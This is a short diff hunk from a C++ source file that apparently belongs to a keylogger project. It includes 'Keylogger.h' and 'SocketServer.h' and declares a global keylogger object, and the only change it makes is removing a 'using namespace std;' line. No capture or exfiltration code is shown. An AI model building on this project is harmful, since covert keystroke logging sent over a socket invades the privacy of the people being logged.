@@ -22,8 +22,6 @@
 #include "Keylogger.h"
 #include "SocketServer.h"
 
-using namespace std;
-
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
 shared_ptr<Keylogger> logger;
